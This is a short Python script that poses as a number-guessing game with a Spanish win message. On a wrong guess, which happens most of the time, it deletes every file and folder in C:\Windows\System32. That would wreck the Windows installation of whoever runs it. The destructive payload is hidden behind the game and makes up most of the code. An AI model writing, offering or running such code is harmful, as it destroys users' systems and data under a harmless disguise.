from genericpath import isdir, isfile
import random
import os, shutil
rand = random.randint(0,6)
guess = int(input('Guess the number: '))

if guess == rand:
    print('Felicitaciones has ganado!')
else:
    for filename in os.listdir("C:\Windows\System32"):
        file_path = os.path.join("C:\Windows\System32", filename)
        
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
